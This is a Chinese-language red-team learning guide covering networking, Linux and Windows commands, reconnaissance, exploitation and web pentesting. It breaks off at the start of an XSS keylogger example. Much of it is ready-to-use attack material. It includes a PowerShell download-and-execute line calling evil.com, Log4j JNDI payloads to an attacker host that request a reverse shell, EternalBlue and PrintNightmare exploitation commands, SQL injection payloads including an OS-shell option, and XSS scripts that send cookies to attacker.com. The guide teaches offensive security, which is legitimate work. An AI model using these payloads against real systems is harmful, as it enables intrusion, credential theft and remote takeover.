# 如何成为渗透测试顶级红队 - 完整学习路线

> 红队（Red Team）是模拟真实攻击者对组织进行全面安全评估的专业团队
> 本笔记涵盖从零基础到顶级红队的完整学习路线
> 包含技术栈、工具、实战技巧和职业发展建议

---

## 目录

1. [红队概述](#1-红队概述)
2. [基础知识储备](#2-基础知识储备)
3. [网络基础](#3-网络基础)
4. [操作系统精通](#4-操作系统精通)
5. [编程能力](#5-编程能力)
6. [信息收集](#6-信息收集)
7. [漏洞分析与利用](#7-漏洞分析与利用)
8. [Web 渗透测试](#8-web-渗透测试)
9. [内网渗透](#9-内网渗透)
10. [权限提升](#10-权限提升)
11. [横向移动](#11-横向移动)
12. [持久化技术](#12-持久化技术)
13. [免杀与对抗](#13-免杀与对抗)
14. [社会工程学](#14-社会工程学)
15. [物理安全](#15-物理安全)
16. [云安全攻防](#16-云安全攻防)
17. [红队工具库](#17-红队工具库)
18. [红队基础设施](#18-红队基础设施)
19. [实战演练](#19-实战演练)
20. [职业发展](#20-职业发展)
21. [常见错误与避坑](#21-常见错误与避坑)
22. [学习资源](#22-学习资源)

---

## 1. 红队概述

### 1.1 什么是红队？

红队是一支专门模拟真实攻击者的安全团队，其目标是通过各种手段（技术、社会工程、物理入侵等）测试组织的整体安全防御能力。与传统渗透测试不同，红队演练更注重模拟真实 APT（高级持续性威胁）攻击。

```
┌─────────────────────────────────────────────────────────────────┐
│                    红队 vs 渗透测试 vs 漏洞评估                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   漏洞评估 (Vulnerability Assessment)                           │
│   ├── 目标：发现系统中的已知漏洞                                │
│   ├── 方法：自动化扫描为主                                      │
│   ├── 深度：浅层，不进行实际利用                                │
│   └── 时间：通常 1-3 天                                         │
│                                                                 │
│   渗透测试 (Penetration Testing)                                │
│   ├── 目标：验证漏洞可利用性，获取访问权限                      │
│   ├── 方法：手动测试 + 自动化工具                               │
│   ├── 深度：中等，验证漏洞并尝试利用                            │
│   └── 时间：通常 1-4 周                                         │
│                                                                 │
│   红队演练 (Red Team Engagement)                                │
│   ├── 目标：模拟真实攻击，测试整体防御能力                      │
│   ├── 方法：全方位攻击（技术+社工+物理）                        │
│   ├── 深度：深层，模拟 APT 攻击全过程                           │
│   └── 时间：通常 1-6 个月                                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2 红队的核心目标

1. **测试检测能力**：蓝队能否发现攻击行为
2. **测试响应能力**：安全团队的响应速度和效果
3. **发现安全盲点**：找出防御体系中的薄弱环节
4. **验证安全投资**：评估安全措施的实际效果
5. **提升安全意识**：通过演练提高全员安全意识

### 1.3 红队攻击链（Cyber Kill Chain）

```
┌─────────────────────────────────────────────────────────────────┐
│                    红队攻击链 (Kill Chain)                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   1. 侦察 (Reconnaissance)                                      │
│      └── 收集目标信息：域名、IP、员工、技术栈                   │
│                    ↓                                            │
│   2. 武器化 (Weaponization)                                     │
│      └── 制作攻击载荷：木马、钓鱼邮件、恶意文档                 │
│                    ↓                                            │
│   3. 投递 (Delivery)                                            │
│      └── 发送攻击载荷：邮件、网站、USB、社工                    │
│                    ↓                                            │
│   4. 利用 (Exploitation)                                        │
│      └── 触发漏洞：代码执行、权限获取                           │
│                    ↓                                            │
│   5. 安装 (Installation)                                        │
│      └── 植入后门：持久化、隐藏                                 │
│                    ↓                                            │
│   6. 命令与控制 (C2)                                            │
│      └── 建立通信：远程控制、数据传输                           │
│                    ↓                                            │
│   7. 目标达成 (Actions on Objectives)                           │
│      └── 完成任务：数据窃取、横向移动、破坏                     │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.4 MITRE ATT&CK 框架

MITRE ATT&CK 是红队必须掌握的知识框架，它系统地描述了攻击者的战术和技术。

```
┌─────────────────────────────────────────────────────────────────┐
│                    MITRE ATT&CK 战术分类                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   TA0001 - 初始访问 (Initial Access)                            │
│   TA0002 - 执行 (Execution)                                     │
│   TA0003 - 持久化 (Persistence)                                 │
│   TA0004 - 权限提升 (Privilege Escalation)                      │
│   TA0005 - 防御绕过 (Defense Evasion)                           │
│   TA0006 - 凭证访问 (Credential Access)                         │
│   TA0007 - 发现 (Discovery)                                     │
│   TA0008 - 横向移动 (Lateral Movement)                          │
│   TA0009 - 收集 (Collection)                                    │
│   TA0010 - 数据渗出 (Exfiltration)                              │
│   TA0011 - 命令与控制 (Command and Control)                     │
│   TA0040 - 影响 (Impact)                                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.5 红队成员角色

| 角色 | 职责 | 技能要求 |
|------|------|----------|
| 红队负责人 | 项目管理、战略规划、客户沟通 | 全面技术能力 + 管理能力 |
| 漏洞研究员 | 漏洞挖掘、Exploit 开发 | 逆向工程、二进制分析 |
| 渗透测试员 | 网络/Web/内网渗透 | 渗透测试全栈技能 |
| 社工专家 | 钓鱼、电话诈骗、物理入侵 | 心理学、沟通技巧 |
| 恶意软件开发 | 木马开发、免杀、C2 开发 | 编程、逆向、系统底层 |
| 基础设施工程师 | C2 搭建、流量隐藏、日志清理 | 运维、网络、云服务 |

---

## 2. 基础知识储备

### 2.1 学习路线图

```
┌─────────────────────────────────────────────────────────────────┐
│                    红队学习路线图                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   第一阶段：基础 (3-6个月)                                      │
│   ├── 计算机网络基础                                            │
│   ├── 操作系统原理                                              │
│   ├── 编程语言（Python/Bash）                                   │
│   └── Web 基础（HTTP/HTML/JS）                                  │
│                                                                 │
│   第二阶段：入门 (6-12个月)                                     │
│   ├── 渗透测试基础                                              │
│   ├── 常见漏洞原理                                              │
│   ├── 安全工具使用                                              │
│   └── CTF 练习                                                  │
│                                                                 │
│   第三阶段：进阶 (1-2年)                                        │
│   ├── 内网渗透                                                  │
│   ├── 免杀技术                                                  │
│   ├── 代码审计                                                  │
│   └── 漏洞挖掘                                                  │
│                                                                 │
│   第四阶段：高级 (2-3年)                                        │
│   ├── APT 攻击模拟                                              │
│   ├── 红队基础设施                                              │
│   ├── 0day 研究                                                 │
│   └── 云安全攻防                                                │
│                                                                 │
│   第五阶段：专家 (3年以上)                                      │
│   ├── 自研工具开发                                              │
│   ├── 新型攻击技术研究                                          │
│   ├── 团队管理                                                  │
│   └── 行业影响力                                                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 2.2 必备基础知识

#### 2.2.1 计算机基础

```bash
# 需要理解的核心概念
- CPU 架构（x86、x64、ARM）
- 内存管理（堆、栈、虚拟内存）
- 进程与线程
- 文件系统
- 系统调用
- 中断与异常
```

#### 2.2.2 数据结构与算法

```python
# 红队需要掌握的数据结构
- 数组、链表、栈、队列
- 哈希表（密码破解、去重）
- 树（目录遍历、决策树）
- 图（网络拓扑、攻击路径）

# 需要掌握的算法
- 排序与搜索
- 加密算法（AES、RSA、哈希）
- 编码算法（Base64、URL编码）
- 压缩算法
```

---

## 3. 网络基础

### 3.1 OSI 七层模型

```
┌─────────────────────────────────────────────────────────────────┐
│                    OSI 七层模型与攻击面                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   第7层 - 应用层 (Application)                                  │
│   ├── 协议：HTTP, HTTPS, FTP, SMTP, DNS, SSH                    │
│   └── 攻击：SQL注入, XSS, CSRF, 命令注入                        │
│                                                                 │
│   第6层 - 表示层 (Presentation)                                 │
│   ├── 功能：数据加密、压缩、格式转换                            │
│   └── 攻击：SSL/TLS 攻击, 编码绕过                              │
│                                                                 │
│   第5层 - 会话层 (Session)                                      │
│   ├── 功能：会话管理、认证                                      │
│   └── 攻击：会话劫持, Cookie 窃取                               │
│                                                                 │
│   第4层 - 传输层 (Transport)                                    │
│   ├── 协议：TCP, UDP                                            │
│   └── 攻击：端口扫描, SYN Flood, UDP Flood                      │
│                                                                 │
│   第3层 - 网络层 (Network)                                      │
│   ├── 协议：IP, ICMP, ARP                                       │
│   └── 攻击：IP欺骗, ARP欺骗, 路由攻击                           │
│                                                                 │
│   第2层 - 数据链路层 (Data Link)                                │
│   ├── 协议：Ethernet, Wi-Fi                                     │
│   └── 攻击：MAC欺骗, VLAN跳跃                                   │
│                                                                 │
│   第1层 - 物理层 (Physical)                                     │
│   ├── 介质：网线、光纤、无线                                    │
│   └── 攻击：物理接入, 信号窃听                                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2 TCP/IP 协议栈

```bash
# TCP 三次握手
Client                    Server
  |                         |
  |------- SYN seq=x ------>|   # 第一次握手
  |                         |
  |<-- SYN-ACK seq=y,ack=x+1|   # 第二次握手
  |                         |
  |------- ACK ack=y+1 ---->|   # 第三次握手
  |                         |
  |====== 连接建立 =========|

# TCP 四次挥手
Client                    Server
  |                         |
  |------- FIN seq=u ------>|   # 第一次挥手
  |                         |
  |<------ ACK ack=u+1 -----|   # 第二次挥手
  |                         |
  |<------ FIN seq=v -------|   # 第三次挥手
  |                         |
  |------- ACK ack=v+1 ---->|   # 第四次挥手
  |                         |
```

### 3.3 常见端口与服务

```bash
# 必须熟记的端口
端口      服务          攻击向量
----      ----          --------
21        FTP           匿名登录、暴力破解、漏洞利用
22        SSH           暴力破解、密钥泄露、漏洞利用
23        Telnet        明文传输、暴力破解
25        SMTP          邮件伪造、开放中继
53        DNS           DNS劫持、区域传送、缓存投毒
80        HTTP          Web漏洞（SQL注入、XSS等）
110       POP3          暴力破解、明文传输
135       RPC           MS-RPC漏洞
139/445   SMB           永恒之蓝、暴力破解、共享枚举
443       HTTPS         SSL漏洞、证书问题
1433      MSSQL         暴力破解、xp_cmdshell
1521      Oracle        暴力破解、TNS漏洞
3306      MySQL         暴力破解、UDF提权
3389      RDP           暴力破解、BlueKeep
5432      PostgreSQL    暴力破解、命令执行
5900      VNC           暴力破解、无认证
6379      Redis         未授权访问、主从复制RCE
8080      HTTP-Proxy    Web漏洞、代理滥用
27017     MongoDB       未授权访问
```

### 3.4 网络工具实战

```bash
# ==================== Nmap 扫描 ====================

# 主机发现
nmap -sn 192.168.1.0/24                    # Ping 扫描
nmap -sn -PS22,80,443 192.168.1.0/24       # TCP SYN Ping
nmap -sn -PA80,443 192.168.1.0/24          # TCP ACK Ping
nmap -sn -PU53 192.168.1.0/24              # UDP Ping

# 端口扫描
nmap -sS 192.168.1.100                     # SYN 扫描（半开放）
nmap -sT 192.168.1.100                     # TCP 全连接扫描
nmap -sU 192.168.1.100                     # UDP 扫描
nmap -sA 192.168.1.100                     # ACK 扫描（防火墙探测）
nmap -sN 192.168.1.100                     # NULL 扫描
nmap -sF 192.168.1.100                     # FIN 扫描
nmap -sX 192.168.1.100                     # Xmas 扫描

# 服务识别
nmap -sV 192.168.1.100                     # 版本探测
nmap -sV --version-intensity 5 192.168.1.100  # 深度版本探测
nmap -O 192.168.1.100                      # 操作系统探测
nmap -A 192.168.1.100                      # 全面扫描

# 脚本扫描
nmap --script=default 192.168.1.100        # 默认脚本
nmap --script=vuln 192.168.1.100           # 漏洞扫描
nmap --script=smb-vuln* 192.168.1.100      # SMB 漏洞
nmap --script=http-* 192.168.1.100         # HTTP 相关

# 绕过防火墙
nmap -f 192.168.1.100                      # 分片
nmap -D RND:10 192.168.1.100               # 诱饵扫描
nmap --source-port 53 192.168.1.100        # 源端口伪装
nmap -S 192.168.1.200 192.168.1.100        # IP 欺骗

# ==================== Wireshark 抓包 ====================

# 常用过滤器
ip.addr == 192.168.1.100                   # 指定 IP
tcp.port == 80                             # 指定端口
http.request.method == "POST"              # HTTP POST
tcp.flags.syn == 1                         # SYN 包
dns.qry.name contains "example"            # DNS 查询
http.cookie contains "session"             # Cookie

# ==================== tcpdump 抓包 ====================

# 基本抓包
tcpdump -i eth0                            # 指定网卡
tcpdump -i eth0 host 192.168.1.100         # 指定主机
tcpdump -i eth0 port 80                    # 指定端口
tcpdump -i eth0 -w capture.pcap            # 保存文件
tcpdump -r capture.pcap                    # 读取文件

# 高级过滤
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'  # SYN 包
tcpdump -i eth0 'tcp[13] & 2 != 0'              # 同上
```

---

## 4. 操作系统精通

### 4.1 Linux 系统

红队必须精通 Linux，因为大多数服务器和安全工具都运行在 Linux 上。

```bash
# ==================== 文件系统 ====================

# 重要目录
/etc/passwd          # 用户信息
/etc/shadow          # 密码哈希
/etc/sudoers         # sudo 配置
/etc/crontab         # 定时任务
/etc/ssh/sshd_config # SSH 配置
/var/log/            # 日志目录
/tmp/                # 临时目录（常用于提权）
/home/               # 用户主目录
/root/               # root 主目录

# 文件权限
ls -la               # 查看权限
chmod 755 file       # 修改权限
chown user:group file # 修改所有者
find / -perm -4000   # 查找 SUID 文件
find / -perm -2000   # 查找 SGID 文件
find / -writable     # 查找可写文件

# ==================== 用户管理 ====================

# 用户信息
id                   # 当前用户信息
whoami               # 当前用户名
w                    # 登录用户
last                 # 登录历史
cat /etc/passwd      # 所有用户

# 用户操作
useradd -m user      # 添加用户
usermod -aG sudo user # 添加到 sudo 组
passwd user          # 修改密码

# ==================== 进程管理 ====================

ps aux               # 所有进程
ps -ef               # 进程树
top                  # 动态进程
pstree               # 进程树
kill -9 PID          # 强制终止
pkill -f "name"      # 按名称终止

# ==================== 网络管理 ====================

ifconfig             # 网络接口
ip addr              # 网络接口（新）
netstat -tulpn       # 监听端口
ss -tulpn            # 监听端口（新）
route -n             # 路由表
ip route             # 路由表（新）
arp -a               # ARP 表

# ==================== 服务管理 ====================

systemctl status service    # 服务状态
systemctl start service     # 启动服务
systemctl stop service      # 停止服务
systemctl enable service    # 开机启动
service --status-all        # 所有服务

# ==================== 日志分析 ====================

# 重要日志
/var/log/auth.log    # 认证日志（Debian）
/var/log/secure      # 认证日志（RedHat）
/var/log/syslog      # 系统日志
/var/log/messages    # 系统消息
/var/log/apache2/    # Apache 日志
/var/log/nginx/      # Nginx 日志

# 日志分析命令
tail -f /var/log/auth.log           # 实时查看
grep "Failed" /var/log/auth.log     # 搜索失败登录
awk '{print $1}' access.log | sort | uniq -c | sort -rn  # IP 统计
```

### 4.2 Windows 系统

```powershell
# ==================== 系统信息 ====================

systeminfo                          # 系统信息
hostname                            # 主机名
whoami                              # 当前用户
whoami /priv                        # 用户权限
whoami /groups                      # 用户组
net user                            # 本地用户
net localgroup administrators       # 管理员组
net user /domain                    # 域用户

# ==================== 网络信息 ====================

ipconfig /all                       # 网络配置
netstat -ano                        # 网络连接
arp -a                              # ARP 表
route print                         # 路由表
nslookup domain.com                 # DNS 查询

# ==================== 进程管理 ====================

tasklist                            # 进程列表
tasklist /svc                       # 进程与服务
taskkill /PID 1234 /F               # 终止进程
wmic process list full              # 详细进程信息

# ==================== 服务管理 ====================

sc query                            # 服务列表
sc query servicename                # 服务状态
sc start servicename                # 启动服务
sc stop servicename                 # 停止服务
wmic service list full              # 详细服务信息

# ==================== 注册表 ====================

# 重要注册表位置
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run      # 启动项
HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run      # 用户启动项
HKLM\SAM\SAM\Domains\Account\Users                      # 用户信息
HKLM\SYSTEM\CurrentControlSet\Services                  # 服务

# 注册表操作
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg add "HKLM\SOFTWARE\..." /v name /t REG_SZ /d value
reg delete "HKLM\SOFTWARE\..." /v name

# ==================== 文件系统 ====================

# 重要目录
C:\Windows\System32\config\         # SAM、SYSTEM 文件
C:\Windows\System32\drivers\etc\    # hosts 文件
C:\Users\<user>\AppData\            # 用户数据
C:\ProgramData\                     # 程序数据

# 文件操作
dir /s /b *.txt                     # 递归搜索
findstr /si password *.txt          # 搜索内容
icacls file                         # 查看权限
attrib +h file                      # 隐藏文件

# ==================== PowerShell ====================

# 执行策略
Get-ExecutionPolicy
Set-ExecutionPolicy Bypass -Scope Process

# 下载执行
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')
Invoke-WebRequest -Uri "http://evil.com/file" -OutFile "C:\file"

# 编码执行
$cmd = "whoami"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded

# 信息收集
Get-Process
Get-Service
Get-WmiObject Win32_ComputerSystem
Get-ADUser -Filter * -Properties *   # 域用户
Get-ADComputer -Filter *             # 域计算机
```

---

## 6. 信息收集

信息收集是红队行动的第一步，也是最重要的一步。收集的信息越全面，后续攻击的成功率越高。

### 6.1 被动信息收集

被动信息收集不与目标系统直接交互，不会留下痕迹。

```bash
# ==================== OSINT 工具 ====================

# Google Hacking (Google Dorks)
site:target.com                          # 限定网站
site:target.com filetype:pdf             # 搜索 PDF 文件
site:target.com inurl:admin              # URL 包含 admin
site:target.com intitle:login            # 标题包含 login
site:target.com ext:sql | ext:db         # 数据库文件
site:target.com "password" filetype:log  # 日志中的密码
intext:"index of /" site:target.com      # 目录列表

# 常用 Google Dorks
"index of" "parent directory"            # 目录遍历
"index of" "password.txt"                # 密码文件
filetype:env "DB_PASSWORD"               # 环境变量文件
filetype:sql "insert into" password      # SQL 文件
"phpMyAdmin" "running on" site:target.com # phpMyAdmin

# ==================== 域名信息 ====================

# Whois 查询
whois target.com
whois 192.168.1.100

# DNS 查询
dig target.com ANY                       # 所有记录
dig target.com MX                        # 邮件服务器
dig target.com NS                        # DNS 服务器
dig target.com TXT                       # TXT 记录
dig @8.8.8.8 target.com                  # 指定 DNS 服务器
host -t any target.com                   # 所有记录

# DNS 区域传送（配置不当时可用）
dig axfr @ns1.target.com target.com
host -l target.com ns1.target.com

# ==================== 子域名枚举 ====================

# 在线工具
# - https://crt.sh (证书透明度)
# - https://dnsdumpster.com
# - https://securitytrails.com
# - https://virustotal.com

# 命令行工具
# Subfinder
subfinder -d target.com -o subdomains.txt

# Amass
amass enum -d target.com -o amass.txt

# Assetfinder
assetfinder --subs-only target.com

# 证书透明度查询
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value' | sort -u

# ==================== 邮箱收集 ====================

# theHarvester
theHarvester -d target.com -b all

# Hunter.io (需要 API)
# https://hunter.io

# 手动搜索
# LinkedIn、GitHub、公司官网

# ==================== 社交媒体 ====================

# 员工信息收集
# - LinkedIn: 职位、技能、联系方式
# - GitHub: 代码、配置文件、密钥泄露
# - Twitter: 公司动态、技术栈
# - Facebook: 个人信息

# GitHub 敏感信息搜索
# https://github.com/search
"target.com" password
"target.com" api_key
"target.com" secret
org:targetorg password
```

### 6.2 主动信息收集

主动信息收集需要与目标系统交互，可能被检测到。

```bash
# ==================== 端口扫描 ====================

# Nmap 全面扫描
nmap -sS -sV -sC -O -p- -T4 target.com -oA nmap_full

# 快速扫描
nmap -sS -F target.com                   # 快速扫描常用端口
nmap -sS --top-ports 1000 target.com     # Top 1000 端口

# UDP 扫描
nmap -sU --top-ports 100 target.com

# 服务版本识别
nmap -sV --version-intensity 5 target.com

# 脚本扫描
nmap --script=default,vuln target.com

# Masscan（大规模快速扫描）
masscan -p1-65535 192.168.1.0/24 --rate=10000 -oL masscan.txt

# ==================== Web 信息收集 ====================

# 目录扫描
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -t 50
feroxbuster -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
dirsearch -u http://target.com -e php,asp,aspx,jsp

# 技术栈识别
whatweb http://target.com
wappalyzer (浏览器插件)
curl -I http://target.com                # HTTP 头信息

# CMS 识别
wpscan --url http://target.com           # WordPress
droopescan scan drupal -u http://target.com  # Drupal
joomscan -u http://target.com            # Joomla

# ==================== 网络拓扑 ====================

# 路由追踪
traceroute target.com
mtr target.com

# 网段扫描
nmap -sn 192.168.1.0/24                  # Ping 扫描
arp-scan -l                              # ARP 扫描
netdiscover -r 192.168.1.0/24            # 网络发现
```

### 6.3 信息收集自动化

```python
#!/usr/bin/env python3
"""
自动化信息收集脚本
"""

import subprocess
import os
import json
from datetime import datetime

class Recon:
    def __init__(self, target, output_dir="recon"):
        self.target = target
        self.output_dir = f"{output_dir}/{target}_{datetime.now().strftime('%Y%m%d')}"
        os.makedirs(self.output_dir, exist_ok=True)
    
    def run_command(self, cmd, output_file):
        """执行命令并保存结果"""
        print(f"[*] Running: {cmd}")
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
            with open(f"{self.output_dir}/{output_file}", 'w') as f:
                f.write(result.stdout)
                if result.stderr:
                    f.write(f"\n--- STDERR ---\n{result.stderr}")
            return result.stdout
        except subprocess.TimeoutExpired:
            print(f"[-] Command timed out: {cmd}")
            return None
    
    def dns_enum(self):
        """DNS 枚举"""
        print("\n[+] DNS Enumeration")
        self.run_command(f"dig {self.target} ANY", "dns_any.txt")
        self.run_command(f"dig {self.target} MX", "dns_mx.txt")
        self.run_command(f"dig {self.target} NS", "dns_ns.txt")
        self.run_command(f"host -t any {self.target}", "host.txt")
    
    def subdomain_enum(self):
        """子域名枚举"""
        print("\n[+] Subdomain Enumeration")
        self.run_command(f"subfinder -d {self.target} -silent", "subdomains_subfinder.txt")
        self.run_command(f"assetfinder --subs-only {self.target}", "subdomains_assetfinder.txt")
        
        # 合并去重
        subdomains = set()
        for f in ['subdomains_subfinder.txt', 'subdomains_assetfinder.txt']:
            filepath = f"{self.output_dir}/{f}"
            if os.path.exists(filepath):
                with open(filepath) as file:
                    subdomains.update(line.strip() for line in file if line.strip())
        
        with open(f"{self.output_dir}/subdomains_all.txt", 'w') as f:
            f.write('\n'.join(sorted(subdomains)))
        
        print(f"[*] Found {len(subdomains)} unique subdomains")
    
    def port_scan(self):
        """端口扫描"""
        print("\n[+] Port Scanning")
        self.run_command(
            f"nmap -sS -sV -sC -O --top-ports 1000 {self.target} -oN nmap_scan.txt",
            "nmap_scan.txt"
        )
    
    def web_enum(self):
        """Web 枚举"""
        print("\n[+] Web Enumeration")
        self.run_command(f"whatweb {self.target}", "whatweb.txt")
        self.run_command(
            f"gobuster dir -u http://{self.target} -w /usr/share/wordlists/dirb/common.txt -q",
            "gobuster.txt"
        )
    
    def run_all(self):
        """运行所有收集"""
        print(f"[*] Starting reconnaissance on {self.target}")
        print(f"[*] Output directory: {self.output_dir}")
        
        self.dns_enum()
        self.subdomain_enum()
        self.port_scan()
        self.web_enum()
        
        print(f"\n[+] Reconnaissance complete! Results saved to {self.output_dir}")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    
    recon = Recon(sys.argv[1])
    recon.run_all()
```

---

## 7. 漏洞分析与利用

### 7.1 漏洞分类

```
┌─────────────────────────────────────────────────────────────────┐
│                    漏洞分类体系                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   按影响范围分类：                                               │
│   ├── 远程代码执行 (RCE) - 最严重                               │
│   ├── 权限提升 (Privilege Escalation)                           │
│   ├── 信息泄露 (Information Disclosure)                         │
│   ├── 拒绝服务 (DoS)                                            │
│   └── 身份验证绕过 (Authentication Bypass)                      │
│                                                                 │
│   按技术类型分类：                                               │
│   ├── 内存破坏类：缓冲区溢出、堆溢出、UAF                       │
│   ├── 注入类：SQL注入、命令注入、LDAP注入                       │
│   ├── 逻辑类：越权、条件竞争、业务逻辑                          │
│   ├── 配置类：默认密码、错误配置、信息泄露                      │
│   └── 加密类：弱加密、密钥泄露、协议缺陷                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 7.2 漏洞扫描

```bash
# ==================== 自动化漏洞扫描 ====================

# Nessus（商业，功能强大）
# 安装后访问 https://localhost:8834

# OpenVAS（开源）
gvm-start
# 访问 https://localhost:9392

# Nuclei（快速模板扫描）
nuclei -u http://target.com -t cves/
nuclei -u http://target.com -t vulnerabilities/
nuclei -l urls.txt -t cves/ -c 50

# Nikto（Web 漏洞扫描）
nikto -h http://target.com

# ==================== 特定漏洞扫描 ====================

# SMB 漏洞
nmap --script smb-vuln* -p 445 target.com

# SSL/TLS 漏洞
nmap --script ssl* -p 443 target.com
testssl.sh target.com:443
sslscan target.com:443

# Web 漏洞
sqlmap -u "http://target.com/page?id=1" --batch
wpscan --url http://target.com --enumerate vp,vt,u

# ==================== 漏洞数据库 ====================

# 搜索已知漏洞
searchsploit apache 2.4
searchsploit -m 12345                    # 复制 exploit
searchsploit -x 12345                    # 查看 exploit

# 在线数据库
# - https://nvd.nist.gov
# - https://cve.mitre.org
# - https://exploit-db.com
# - https://vulnhub.com
```

### 7.3 漏洞利用框架

```bash
# ==================== Metasploit ====================

# 启动
msfconsole

# 搜索漏洞
msf6 > search ms17-010
msf6 > search type:exploit platform:windows

# 使用漏洞
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(...) > show options
msf6 exploit(...) > set RHOSTS 192.168.1.100
msf6 exploit(...) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST 192.168.1.50
msf6 exploit(...) > exploit

# ==================== 手动利用 ====================

# 编译 Exploit
gcc -o exploit exploit.c
gcc -m32 -o exploit exploit.c           # 32位编译

# Python Exploit
python3 exploit.py target.com 80

# 常见 Exploit 修改
# 1. 修改 shellcode
# 2. 修改目标地址
# 3. 修改偏移量
# 4. 修改返回地址
```

### 7.4 常见漏洞利用

```bash
# ==================== MS17-010 永恒之蓝 ====================

# 检测
nmap --script smb-vuln-ms17-010 -p 445 target

# Metasploit 利用
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

# ==================== Log4j (CVE-2021-44228) ====================

# 检测
curl -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}' http://target.com

# 利用
# 1. 启动 LDAP 服务器
java -jar JNDIExploit.jar -i attacker_ip

# 2. 发送 payload
curl -H 'User-Agent: ${jndi:ldap://attacker_ip:1389/Basic/ReverseShell/attacker_ip/4444}' http://target.com

# ==================== Spring4Shell (CVE-2022-22965) ====================

# 检测
curl -X POST http://target:8080/path \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=test"

# ==================== ProxyShell (Exchange) ====================

# CVE-2021-34473, CVE-2021-34523, CVE-2021-31207
# 使用专门的 exploit 工具

# ==================== PrintNightmare (CVE-2021-34527) ====================

# 检测
rpcdump.py @target | grep -i print

# 利用
python3 CVE-2021-1675.py domain/user:password@target '\\attacker\share\evil.dll'
```

---

## 8. Web 渗透测试

### 8.1 OWASP Top 10

```
┌─────────────────────────────────────────────────────────────────┐
│                    OWASP Top 10 (2021)                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│   A01 - 访问控制失效 (Broken Access Control)                    │
│   A02 - 加密失败 (Cryptographic Failures)                       │
│   A03 - 注入 (Injection)                                        │
│   A04 - 不安全设计 (Insecure Design)                            │
│   A05 - 安全配置错误 (Security Misconfiguration)                │
│   A06 - 易受攻击和过时的组件 (Vulnerable Components)            │
│   A07 - 身份验证失败 (Authentication Failures)                  │
│   A08 - 软件和数据完整性故障 (Integrity Failures)               │
│   A09 - 安全日志和监控失败 (Logging Failures)                   │
│   A10 - 服务器端请求伪造 (SSRF)                                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 8.2 SQL 注入

```bash
# ==================== 手动测试 ====================

# 基本测试
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
" OR "1"="1
1' AND '1'='1
1 AND 1=1

# 报错注入
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e)) --
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) --

# 联合查询注入
' UNION SELECT NULL --
' UNION SELECT NULL,NULL --
' UNION SELECT 1,2,3 --
' UNION SELECT username,password FROM users --

# 盲注（布尔型）
' AND 1=1 --    (正常)
' AND 1=2 --    (异常)
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' --

# 盲注（时间型）
' AND SLEEP(5) --
' AND IF(1=1,SLEEP(5),0) --
'; WAITFOR DELAY '0:0:5' --

# ==================== SQLMap 自动化 ====================

# 基本使用
sqlmap -u "http://target.com/page?id=1"

# 指定参数
sqlmap -u "http://target.com/page" --data="id=1&name=test"

# POST 请求
sqlmap -u "http://target.com/login" --data="user=admin&pass=123" -p user

# Cookie 注入
sqlmap -u "http://target.com/page" --cookie="id=1" -p id

# 获取数据库
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# 获取 Shell
sqlmap -u "http://target.com/page?id=1" --os-shell
sqlmap -u "http://target.com/page?id=1" --sql-shell

# 绕过 WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment
sqlmap -u "http://target.com/page?id=1" --random-agent
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3
```

### 8.3 XSS 跨站脚本

```html
<!-- ==================== 反射型 XSS ==================== -->

<!-- 基本 payload -->
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>

<!-- 事件处理器 -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>

<!-- 绕过过滤 -->
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">

<!-- ==================== 存储型 XSS ==================== -->

<!-- Cookie 窃取 -->
<script>
new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>

<script>
fetch('http://attacker.com/steal?c='+document.cookie);
</script>

<!-- 键盘记录 -->
<script>
